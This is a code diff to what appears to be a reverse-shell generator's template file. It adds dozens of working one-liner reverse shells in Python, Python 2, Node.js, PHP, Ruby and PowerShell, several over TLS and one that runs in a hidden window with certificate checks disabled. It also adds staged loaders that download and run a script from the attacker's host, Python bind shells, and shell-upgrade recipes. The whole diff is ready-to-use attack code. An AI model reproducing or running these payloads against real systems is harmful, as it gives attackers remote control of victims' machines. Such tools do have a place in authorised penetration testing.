@@ -191,6 +191,17 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
       `python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
   },
   {
+    id: "python-socket",
+    name: "Python socket",
+    family: "python",
+    platform: "multi",
+    description:
+      "Unversioned Python reverse shell for targets where python is available.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
+  },
+  {
     id: "python2-socket",
     name: "Python 2 socket",
     family: "python",
@@ -198,7 +209,7 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     description: "Python 2-compatible socket reverse shell.",
     defaultShell: "/bin/sh",
     render: ({ lhost, lport, shell }) =>
-      `python -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
+      `python2 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
   },
   {
     id: "python3-pty",
@@ -212,6 +223,27 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
       `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`,
   },
   {
+    id: "python-pty",
+    name: "Python PTY",
+    family: "python",
+    platform: "multi",
+    description: "Unversioned Python reverse shell that spawns a PTY.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python -c 'import os,pty,socket;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`,
+  },
+  {
+    id: "python2-pty",
+    name: "Python 2 PTY",
+    family: "python",
+    platform: "multi",
+    description:
+      "Python 2 reverse shell that spawns the selected shell through pty.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python2 -c 'import os,pty,socket;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`,
+  },
+  {
     id: "python3-subprocess",
     name: "Python 3 subprocess",
     family: "python",
@@ -220,6 +252,26 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     defaultShell: "/bin/sh",
     render: ({ lhost, lport, shell }) =>
       `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["${shell}","-i"])'`,
+  },
+  {
+    id: "python-subprocess",
+    name: "Python subprocess",
+    family: "python",
+    platform: "multi",
+    description: "Unversioned Python reverse shell using subprocess.Popen.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["${shell}","-i"])'`,
+  },
+  {
+    id: "python2-subprocess",
+    name: "Python 2 subprocess",
+    family: "python",
+    platform: "multi",
+    description: "Python 2 reverse shell using subprocess.Popen.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["${shell}","-i"])'`,
   },
   {
     id: "python3-no-spaces",
@@ -231,6 +283,36 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     defaultShell: "/bin/sh",
     render: ({ lhost, lport, shell }) =>
       `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("${shell}")'`,
+  },
+  {
+    id: "python3-ssl-socket",
+    name: "Python 3 SSL socket",
+    family: "python",
+    platform: "multi",
+    description: "Python 3 TLS reverse shell using ssl.wrap_socket.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python3 -c 'import os,socket,ssl,subprocess;s=ssl.wrap_socket(socket.socket());s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
+  },
+  {
+    id: "python-ssl-socket",
+    name: "Python SSL socket",
+    family: "python",
+    platform: "multi",
+    description: "Unversioned Python TLS reverse shell using ssl.wrap_socket.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python -c 'import os,socket,ssl,subprocess;s=ssl.wrap_socket(socket.socket());s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
+  },
+  {
+    id: "python2-ssl-socket",
+    name: "Python 2 SSL socket",
+    family: "python",
+    platform: "multi",
+    description: "Python 2 TLS reverse shell using ssl.wrap_socket.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `python2 -c 'import os,socket,ssl,subprocess;s=ssl.wrap_socket(socket.socket());s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
   },
   {
     id: "nodejs-child-process",
@@ -261,6 +343,16 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     defaultShell: "/bin/sh",
     render: ({ lhost, lport, shell }) =>
       `node -e "require('child_process').spawn('${q(shell)}',['-i'],{stdio:['pipe','pipe','pipe']}).on('spawn',function(){const n=require('net').connect(${lport},'${lhost}');this.stdin.pipe(n);n.pipe(this.stdin);this.stdout.pipe(n);this.stderr.pipe(n);})"`,
+  },
+  {
+    id: "nodejs-tls-child-process",
+    name: "Node.js TLS child_process",
+    family: "node",
+    platform: "multi",
+    description: "Node.js TLS reverse shell using tls and child_process.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `node -e "const tls=require('tls'),cp=require('child_process'),sh=cp.spawn('${q(shell)}',['-i']);const c=tls.connect(${lport},'${lhost}',{rejectUnauthorized:false},()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"`,
   },
   {
     id: "java-runtime",
@@ -673,6 +765,26 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
       `php -r '$s=stream_socket_client("tcp://${lhost}:${lport}");while(!feof($s)){$cmd=fgets($s);if($cmd===false)break;$p=popen(trim($cmd),"r");while(!feof($p))fwrite($s,fread($p,1024));pclose($p);}'`,
   },
   {
+    id: "php-ssl-fsockopen",
+    name: "PHP SSL fsockopen",
+    family: "php",
+    platform: "multi",
+    description: "PHP TLS reverse shell using ssl:// fsockopen.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `php -r '$s=fsockopen("ssl://${lhost}",${lport});proc_open("${q(shell)} -i", array(0=>$s, 1=>$s, 2=>$s),$p);'`,
+  },
+  {
+    id: "php-ssl-stream-socket",
+    name: "PHP SSL stream_socket",
+    family: "php",
+    platform: "multi",
+    description: "PHP TLS command loop using stream_socket_client.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport }) =>
+      `php -r '$s=stream_socket_client("ssl://${lhost}:${lport}");while(!feof($s)){$cmd=fgets($s);if($cmd===false)break;$p=popen(trim($cmd),"r");while(!feof($p))fwrite($s,fread($p,1024));pclose($p);}'`,
+  },
+  {
     id: "perl-socket",
     name: "Perl socket",
     family: "perl",
@@ -722,6 +834,16 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     defaultShell: "/bin/sh",
     render: ({ lhost, lport, shell }) =>
       `ruby -rsocket -e 's=TCPSocket.new("${lhost}",${lport});exec sprintf("${q(shell)} -i <&%d >&%d 2>&%d",s.fileno,s.fileno,s.fileno)'`,
+  },
+  {
+    id: "ruby-openssl",
+    name: "Ruby OpenSSL",
+    family: "ruby",
+    platform: "multi",
+    description: "Ruby TLS reverse shell using OpenSSL::SSL::SSLSocket.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `ruby -ropenssl -rsocket -e 'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("${lhost}",${lport}));c.connect;$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec("${q(shell)} -i")'`,
   },
   {
     id: "socat-pty",
@@ -877,6 +999,17 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
       `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
   },
   {
+    id: "powershell-tls-schannel",
+    name: "PowerShell TLS SslStream",
+    family: "powershell",
+    platform: "windows",
+    description:
+      "PowerShell reverse shell over TLS using SslStream and permissive certificate validation.",
+    defaultShell: "powershell.exe",
+    render: ({ lhost, lport }) =>
+      `powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$cb={param($s,$cert,$chain,$err) $true};$ssl=New-Object Net.Security.SslStream($c.GetStream(),$false,$cb);$ssl.AuthenticateAsClient('${lhost}');[byte[]]$b=0..65535|%{0};while(($i=$ssl.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$ssl.Write($sb,0,$sb.Length);$ssl.Flush()};$c.Close()"`,
+  },
+  {
     id: "powershell-nishang-style",
     name: "PowerShell Nishang-style",
     family: "powershell",
@@ -990,6 +1123,27 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     defaultShell: "/bin/sh",
     render: ({ lhost, httpPort, lport, shell }) =>
       `python3 -c 'import urllib.request,subprocess;subprocess.call(["${shell}","-c",urllib.request.urlopen("http://${lhost}:${httpPort ?? lport}/rs.sh").read().decode()])'`,
+  },
+  {
+    id: "python-http-staged",
+    name: "Python HTTP staged",
+    family: "staged",
+    platform: "multi",
+    description:
+      "Unversioned Python loader that downloads and executes a staged script.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, httpPort, lport, shell }) =>
+      `python -c 'import subprocess,urllib2;subprocess.call(["${shell}","-c",urllib2.urlopen("http://${lhost}:${httpPort ?? lport}/rs.sh").read()])'`,
+  },
+  {
+    id: "python2-http-staged",
+    name: "Python 2 HTTP staged",
+    family: "staged",
+    platform: "multi",
+    description: "Python 2 loader that downloads and executes a staged script.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, httpPort, lport, shell }) =>
+      `python2 -c 'import subprocess,urllib2;subprocess.call(["${shell}","-c",urllib2.urlopen("http://${lhost}:${httpPort ?? lport}/rs.sh").read()])'`,
   },
   {
     id: "bash-curl-dropper-staged",
@@ -1115,6 +1269,28 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     defaultShell: "/bin/sh",
     render: ({ lport, shell }) =>
       `python3 -c 'import os,socket,subprocess as p;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];p.call(["${shell}","-i"])'`,
+  },
+  {
+    id: "python-bind",
+    name: "Python bind shell",
+    family: "bind",
+    platform: "multi",
+    description:
+      "Unversioned Python bind shell that listens on the target instead of calling back.",
+    defaultShell: "/bin/sh",
+    render: ({ lport, shell }) =>
+      `python -c 'import os,socket,subprocess as p;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];p.call(["${shell}","-i"])'`,
+  },
+  {
+    id: "python2-bind",
+    name: "Python 2 bind shell",
+    family: "bind",
+    platform: "multi",
+    description:
+      "Python 2 bind shell that listens on the target instead of calling back.",
+    defaultShell: "/bin/sh",
+    render: ({ lport, shell }) =>
+      `python2 -c 'import os,socket,subprocess as p;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];p.call(["${shell}","-i"])'`,
   },
   {
     id: "socat-bind-pty",
@@ -1361,9 +1537,9 @@ export const listenerTemplates: ListenerTemplate[] = [
 export const upgradeRecipes: UpgradeRecipe[] = [
   {
     id: "python-pty",
-    name: "Python PTY upgrade",
+    name: "Python 3 / python PTY upgrade",
     platform: "linux",
-    description: "The most common upgrade path when Python is present.",
+    description: "The common PTY upgrade path that tries python3, then python.",
     steps: (shell) => [
       `python3 -c 'import pty; pty.spawn("${shell}")' || python -c 'import pty; pty.spawn("${shell}")'`,
       "Ctrl-Z",
@@ -1371,6 +1547,85 @@ export const upgradeRecipes: UpgradeRecipe[] = [
       "reset",
       "export TERM=xterm-256color",
       "stty rows 40 columns 120",
+    ],
+  },
+  {
+    id: "python-command-pty",
+    name: "Python PTY upgrade",
+    platform: "multi",
+    description: "PTY upgrade using the unversioned python command.",
+    steps: (shell) => [
+      `python -c 'import pty; pty.spawn("${shell}")'`,
+      "Ctrl-Z",
+      "stty raw -echo; fg",
+      "reset",
+      "export TERM=xterm-256color",
+      "stty rows 40 columns 120",
+    ],
+  },
+  {
+    id: "python2-pty-upgrade",
+    name: "Python 2 PTY upgrade",
+    platform: "multi",
+    description: "PTY upgrade for legacy targets where only python2 exists.",
+    steps: (shell) => [
+      `python2 -c 'import pty; pty.spawn("${shell}")'`,
+      "Ctrl-Z",
+      "stty raw -echo; fg",
+      "reset",
+      "export TERM=xterm-256color",
+      "stty rows 40 columns 120",
+    ],
+  },
+  {
+    id: "bash-interactive",
+    name: "Bash interactive",
+    platform: "multi",
+    description:
+      "Simple first step when Bash exists but the shell is not interactive.",
+    steps: () => [
+      "/bin/bash -i",
+      "export SHELL=/bin/bash",
+      "export TERM=xterm",
+    ],
+  },
+  {
+    id: "sh-interactive",
+    name: "sh interactive fallback",
+    platform: "multi",
+    description: "Minimal interactive fallback for targets without Bash.",
+    steps: () => ["/bin/sh -i", "export SHELL=/bin/sh", "export TERM=xterm"],
+  },
+  {
+    id: "terminal-env",
+    name: "Terminal environment",
+    platform: "multi",
+    description:
+      "Common environment exports for cleaner prompt and terminal behavior.",
+    steps: (shell) => [
+      `export SHELL=${shell}`,
+      "export TERM=xterm-256color",
+      "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH",
+      "alias ll='ls -la'",
+    ],
+  },
+  {
+    id: "terminal-reset",
+    name: "Terminal reset",
+    platform: "multi",
+    description: "Reset a messy terminal after foregrounding a raw shell.",
+    steps: () => ["reset", "stty sane", "export TERM=xterm"],
+  },
+  {
+    id: "terminal-resize",
+    name: "Terminal resize",
+    platform: "multi",
+    description:
+      "Set rows and columns manually when full-screen tools render poorly.",
+    steps: () => [
+      "stty rows 40 columns 120",
+      "export LINES=40",
+      "export COLUMNS=120",
     ],
   },
   {
